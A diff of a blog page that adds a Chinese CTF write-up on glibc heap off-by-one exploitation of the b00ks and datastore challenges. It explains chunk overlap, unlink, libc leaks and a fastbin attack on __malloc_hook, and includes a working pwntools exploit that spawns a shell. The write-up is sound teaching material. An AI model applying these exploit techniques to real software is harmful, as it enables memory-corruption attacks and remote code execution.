@@ -22,7 +22,7 @@
     <meta name="description" content="hurricane618's blog">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>新的开始 · 风之栖息地|hurricane618&#39;s blog</title>
+    <title>glibc堆利用之off by one的两道CTF题目 · 风之栖息地|hurricane618&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -228,7 +228,7 @@
                 <a href="/">风之栖息地</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">新的开始</a>
+                <a href="#" class="post-name">glibc堆利用之off by one的两道CTF题目</a>
             </div>
     </div>
     
@@ -258,7 +258,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            新的开始
+            glibc堆利用之off by one的两道CTF题目
             <!-- 404 -->
             
         </h1>
@@ -277,18 +277,18 @@ height:50vh;
                 
                     <div class="post-intro-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="闲聊">闲聊</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="heap">heap</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">77</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">2.7k</span>阅读时长: <span class="post-count reading-time">10 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/06/26</span>
+                    <span class="post-intro-time">2020/08/07</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -412,17 +412,57 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>之前的博客荒废掉了，所以在github上开一个新的博客希望能够坚持下去吧。也不讲太多矫情的话了，撸起袖子就是肝。</p>
-<p>一开始会更新的比较慢，hexo的博客还需要一段时间适应，之后会逐渐加快。</p>
-<img src="/2018/06/26/new-start/67863722_p0.png">
+        <h2 id="b00ks"><a href="#b00ks" class="headerlink" title="b00ks"></a>b00ks</h2><p>这是一道asis ctf 2016的题目，主要功能是书本记录，除了基本的书本的增删改查功能，还有一个作者名称的改变。程序是一个基本保护除了canary其他全开的64位程序。</p>
+<p>调试写exp的过程参考了ctf-wiki，<a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">先知社区一篇文章</a>，和<a href="https://cq674350529.github.io/2018/06/05/asis-ctf-2016-pwn-b00ks/" target="_blank" rel="noopener">另外一个博客</a>。很多细节上面的文章已经写的很详细了，我补充一些其他细节点。</p>
+<p>这里漏洞的问题是出现在程序自定义的读取函数中，在读完规定长度的数据之后又会在末尾填一个0，这样就会溢出一个空字节。这种漏洞被称为OBO（off by one），这里一共使用了两次，第一次是先把作者name全部填满，这样溢出的0字节就在下一个区域中，随后这个程序有一个管理全局书本的指针数组写在这个name后面，这个操作会覆盖掉那个溢出的0字节，恰巧这个name会被当做字符串输出这样后面的指针就被泄露；第二次是在name后面有指针数组的情况下我们继续重复填充满name字段，这样0字节就会覆盖指针数组中的第一个指针的最低位，改变指针指向的地址，使得指向我们伪造的数据结构。</p>
+<p>所以，obo漏洞可以做到：</p>
+<ol>
+<li>如果该漏洞后面有数据写入，有可能泄露数据</li>
+<li>可以通过溢出一个字节改变指针指向的位置，让它指向伪造的数据。如果在name后面的是其他重要的数据，也可以覆盖达到一些其他效果</li>
+</ol>
+<p>这里伪造数据结构是第二个难点，如果我们在分配空间的时候太小，有可能在覆盖成0字节之后超过了我们能写入的范围，所以在分配的时候尽量大一点。创建书本的过程会先创建book_name，随后是book_description，最后是创建书本的数据结构。结构如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> book_id</span><br><span class="line">    <span class="keyword">char</span>* book_name</span><br><span class="line">    <span class="keyword">char</span>* book_description</span><br><span class="line">    <span class="keyword">int</span> book_size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个结构的指针会被写入name后面的指针数组中。我们能改变的只有description部分，在我们覆盖指针数组中的第一个指针末尾的0字节之后，让其指向description区域，我们在其中就可以伪造结构，让那两个指针指向我们想要读/写的地方，我们就可以任意读写。</p>
+<p>这里的description的偏移需要自己调试来计算，如果是在真实环境下，可能需要循环多试很多次。</p>
+<p>由于开启了FULL RELRO，我们不能直接修改got表，所以这里想到的方法是改写<code>__free_hook</code>或<code>__malloc_hook</code>。但是改写这个就需要libc的地址，我们怎么搞到呢？其实我们在有任意读写的时候，创建一个很大的book2，这样分配内存的时候就会使用mmap的方式，读取到这个地址去计算与libc基地址的offset，之后实际中拿到地址减去这个offset就是libc基地址。</p>
+<p>最后，拿到<code>__free_hook</code>的地址覆盖book2的description指针，之后再对book2的description写入我们的one-gadget，这样一旦出现free，检查到<code>__free_hook</code>不为空，就会执行触发getshell。</p>
+<h3 id="另外的方法"><a href="#另外的方法" class="headerlink" title="另外的方法"></a>另外的方法</h3><p>这里另外的方法就是unlink，这里的off-by-one的漏洞很神奇，不仅仅是在改名字那里有，在修改book描述的地方也有1字节的溢出，只是两种溢出的方式触发不太一样。</p>
+<img src="/2020/08/07/glibc-pwn-off-by-one-1/1.png">
+<p>在改名字那里因为给入的是32，所以a2为32，最后退出是循环是因为回车，而改book描述那里是因为给定的输入为<code>长度-1</code>，最后多写一个字节是因为长度到了。</p>
+<p>所以思路就是让一个book的描述部分伪造出一个chunk，同时溢出一个字节，让下面的描述chunk部分的size最低字节为0，这样我们在free下面的chunk时，会和上面的伪造区块合并，这个时候就会触发unlink，修改一个指定指针。这个指定指针我们选的是book4的描述指针，这样指针移动到了前面，我们再次编辑book4就能修改book4的描述指针指向其他我们的可控区域，比如这里的book6的描述指针区域。通过修改book4的描述就能控制book6的描述指针，改完之后用打印就能任意读数据，如果再修改book6的描述内容就是任意写。</p>
+<p>有了任意读写，这里就还是一样的思路先泄露libc地址，然后找<code>__free_hook</code>，我们在里面写入<code>system</code>的地址，最后free掉book6，因为book6的名字部分是<code>/bin/sh</code>所以就能getshell。</p>
+<h2 id="datastore"><a href="#datastore" class="headerlink" title="datastore"></a>datastore</h2><p>这个是2015 plaidctf的题目，一共有四个操作指令GET、PUT、DUMP、DEL，其中的数据结构逆向较一般的题目要更为复杂，最核心的是一个树结构，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *key;</span><br><span class="line">    <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">char</span> *data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">left</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">right</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">parent</span>;</span></span><br><span class="line">    <span class="keyword">bool</span> is_leaf;</span><br></pre></td></tr></table></figure>
+<p>整个逆向的过程有点复杂，首先是通过树节点第一次初始化那里大概能够判断出前面三个成员，后面的四个结构成员需要结合DUMP和DEL来综合判断。以后遇到这种拥有很多指针而且经常有规律改动的数据结构就可以往树的结构猜想了。</p>
+<p>然而对程序整体分析之后发现，漏洞利用和这个树结构关系不大，最重要的关系是其中的堆分配操作，有点蛋疼。。。这个程序的漏洞点在自定义的一个输入函数中（0x1040）。</p>
+<img src="/2020/08/07/glibc-pwn-off-by-one-1/2.png">
+<p>我们把chunk填满的时候，v1会指向下一字节，如果这个时候末尾是<code>\n</code>，就会退出循环向v1指向的地方写入0，这就溢出了一个null字节。</p>
+<p>这道题和上一道题不一样的地方在于溢出周围的数据不一样，上一道题能够溢出修改指针，但是这道题只能溢出到chunk管理结构中的size上。不过尽管只能溢出到size上还是能发挥出巨大的威力，size中的最后一位表示上个chunk是否在使用，覆盖之后可以让堆管理操作合并堆块构造出UAF的情况。其中的方法采用的ctf-wiki的<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one-zh/#_9" target="_blank" rel="noopener">思路</a>。</p>
+<h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>为了构造出我们可控的堆块顺序，首先会分配很多data大小为0x38的块，然后再释放掉，这样之后需要分配的时候就会从fastbin中获取，而不会破坏我们构造的堆块顺序。</p>
+<p>为了构造出chunk overlap的情况，需要有堆块合并，所以在首尾的堆块必须要超过fastbin的大小，最后的堆块被当做溢出的对象还需要保证堆块大小为0x100的整数倍，这样溢出覆盖不会产生其他的影响。</p>
+<p>在这两个堆块中间需要有个堆块拿来泄露libc地址，然后有个堆块拿来作为fastbin attack，最后还有个堆块拿来溢出到下一块。（在ctf-wiki里面的说法存在一点问题，提到用于溢出的块时说需要为small bin或者unsorted bin的堆块，其实不需要这个限制，只要保证不被0x20和0x40的堆块影响就行，所以这里换成0x80的堆块也是可以的，申请的大小为0x78）</p>
+<p>最终完整的堆块构造如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------+</span><br><span class="line">|      1     |  &lt;-- free 的 size == 0x200 chunk</span><br><span class="line">+------------+</span><br><span class="line">|      2     |  &lt;-- size == 0x60 fastbin chunk，已被分配，且可以读出数据</span><br><span class="line">+------------+</span><br><span class="line">|      5     |  &lt;-- size == 0x71 fastbin chunk，为 fastbin attack 做准备</span><br><span class="line">+------------+</span><br><span class="line">|      3     |  &lt;-- size == 0x200 free 状态的 smallbin/unsortedbin chunk 可写size为0x1f8</span><br><span class="line">+------------+</span><br><span class="line">|      4     |  &lt;-- size == 0x101 被溢出 chunk</span><br><span class="line">+------------+</span><br><span class="line">|      X     |  &lt;-- 任意分配后 chunk 防止 top 合并</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure>
+<p>先逐次分配上面的堆块，末尾的防合并堆块可以小一点否则small bin和unsorted bin中没有合适的堆块会触发堆块的整合，然后释放5，3，1，随后溢出修改堆块4的pre_size和size，释放堆块4，让前面的1，2，5，3和4合并成一个大块放入unsorted bin中，最后再次分配0x200大小的堆块，unsorted bin会在堆块2中写入main_arean的地址，读出2之后可以获得libc的地址。</p>
+<h3 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h3><p>我们拿到libc地址之后，再次分配一个覆盖原来堆块2和堆块3的大小比如：0x100，这样修改fastbin中的fd指针，指向我们想要伪造的堆块，这里选择的是<code>__malloc_hook</code>，通过小幅度偏移伪造正常的堆块。最终的利用就很简单了，分配两次0x60的堆块，在第二次写入one_gadget到<code>__malloc_hook</code>中，随便输入一些指令就能触发malloc，拿到最后的shell。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line">io = process(<span class="string">'./datastore'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(key)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'GET'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'key:\n'</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line">    io.recvuntil(<span class="string">'['</span>)</span><br><span class="line">    num = int(io.recvuntil(<span class="string">' byte'</span>, drop=<span class="keyword">True</span>))</span><br><span class="line">    io.recvuntil(<span class="string">':\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recv(num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">put</span><span class="params">(key, size, data)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'PUT'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'key:\n'</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line">    io.recvuntil(<span class="string">'size:\n'</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">'data:\n'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(data) &lt; size:</span><br><span class="line">        io.send(data.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(key)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'command:\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'DEL'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'key:\n'</span>)</span><br><span class="line">    io.sendline(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    put(str(i), <span class="number">0x38</span>, str(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    delete(str(i))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">put(<span class="string">'1'</span>, <span class="number">0x200</span>, <span class="string">'1'</span>)</span><br><span class="line">put(<span class="string">'2'</span>, <span class="number">0x50</span>, <span class="string">'2'</span>)</span><br><span class="line">put(<span class="string">'5'</span>, <span class="number">0x68</span>, <span class="string">'5'</span>)</span><br><span class="line">put(<span class="string">'3'</span>, <span class="number">0x1f8</span>, <span class="string">'3'</span>)</span><br><span class="line">put(<span class="string">'4'</span>, <span class="number">0xf0</span>, <span class="string">'4'</span>)</span><br><span class="line">put(<span class="string">'defense'</span>, <span class="number">0x40</span>, <span class="string">'defense-data'</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># free those need to be freed</span></span><br><span class="line">delete(<span class="string">'5'</span>)</span><br><span class="line">delete(<span class="string">'3'</span>)</span><br><span class="line">delete(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'a'</span> * <span class="number">0x1f0</span> + p64(<span class="number">0x4e0</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'4'</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># put('0x200', 0x200, 'fillup')  # get another chunk 0x200</span></span><br><span class="line">put(<span class="string">'0x200 fillup'</span>, <span class="number">0x200</span>, <span class="string">'fillup again'</span>)</span><br><span class="line"></span><br><span class="line">libc_leak = u64(get(<span class="string">'2'</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">info(<span class="string">'libc leak: 0x%x'</span> % libc_leak)</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - <span class="number">0x3c4b78</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">'libc_base: 0x%x'</span> % libc_base)</span><br><span class="line"></span><br><span class="line">put(<span class="string">'fastatk'</span>, <span class="number">0x100</span>, <span class="string">'a'</span> * <span class="number">0x58</span> + p64(<span class="number">0x71</span>) + p64(libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>] - <span class="number">0x10</span> + <span class="number">5</span> - <span class="number">8</span>))  <span class="comment"># change fd</span></span><br><span class="line">put(<span class="string">'prepare'</span>, <span class="number">0x68</span>, <span class="string">'prepare data'</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">put(<span class="string">'attack'</span>, <span class="number">0x68</span>, <span class="string">'a'</span> * <span class="number">3</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'DEL'</span>) <span class="comment"># malloc(8) triggers one_gadget</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><p><a href="https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/" target="_blank" rel="noopener">https://0x3f97.github.io/pwn/2018/01/27/plaidctf2015-plaiddb/</a></p>
+<p>详细一点的有看雪的一个<a href="https://bbs.pediy.com/thread-246966.htm" target="_blank" rel="noopener">帖子</a>和先知社区的<a href="https://xz.aliyun.com/t/6169#toc-3" target="_blank" rel="noopener">帖子</a></p>
+<p>这个做法更加复杂，没有像上面的做法先释放很多堆块拿来当做树结构堆块，这样就要考虑到每次树结构的分配对堆块布局的影响，并且最后在覆盖的时候需要考虑不破坏之前堆上的数据。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>off by one的利用总的来说思路有：</p>
+<ol>
+<li>如果能修改到指针，那么可以尝试构造unlink和任意读写</li>
+<li>如果只能修改堆块的size，那么可以尝试chunk overlap</li>
+</ol>
+
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://hurricane618.me">hurricane618</a>
-            </p><p>原文链接：<a href="https://hurricane618.me/2018/06/26/new-start/">https://hurricane618.me/2018/06/26/new-start/</a>
-            </p><p>发表日期：<a href="https://hurricane618.me/2018/06/26/new-start/">June 26th 2018, 11:10:58 am</a>
-            </p><p>更新日期：<a href="https://hurricane618.me/2018/06/26/new-start/">July 19th 2018, 9:05:30 am</a>
+            </p><p>原文链接：<a href="https://hurricane618.me/2020/08/07/glibc-pwn-off-by-one-1/">https://hurricane618.me/2020/08/07/glibc-pwn-off-by-one-1/</a>
+            </p><p>发表日期：<a href="https://hurricane618.me/2020/08/07/glibc-pwn-off-by-one-1/">August 7th 2020, 9:32:14 pm</a>
+            </p><p>更新日期：<a href="https://hurricane618.me/2020/08/07/glibc-pwn-off-by-one-1/">August 7th 2020, 9:32:14 pm</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -430,13 +470,13 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2018/06/30/csp-bypass-summary/" title="CSP绕过总结">
-                    <div class="nextTitle">CSP绕过总结</div>
-                </a>
-            
         </li>
         <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/08/01/2020rctf-some-pwn/" title="2020RCTF 几道pwn题的复现">
+                    <div class="prevTitle">2020RCTF 几道pwn题的复现</div>
+                </a>
             
         </li>
     </ul>
@@ -452,8 +492,8 @@ height:50vh;
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
         
         var disqus_config = function () {
-        this.page.url = "https://hurricane618.me/2018/06/26/new-start/";  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = "新的开始"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = "https://hurricane618.me/2020/08/07/glibc-pwn-off-by-one-1/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "glibc堆利用之off by one的两道CTF题目"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
         };
         
         (function () { // DON'T EDIT BELOW THIS LINE
@@ -577,7 +617,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#b00ks"><span class="toc-number">1.</span> <span class="toc-text">b00ks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#另外的方法"><span class="toc-number">1.1.</span> <span class="toc-text">另外的方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#datastore"><span class="toc-number">2.</span> <span class="toc-text">datastore</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#leak-libc"><span class="toc-number">2.1.</span> <span class="toc-text">leak libc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-attack"><span class="toc-number">2.2.</span> <span class="toc-text">fastbin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他思路"><span class="toc-number">2.4.</span> <span class="toc-text">其他思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
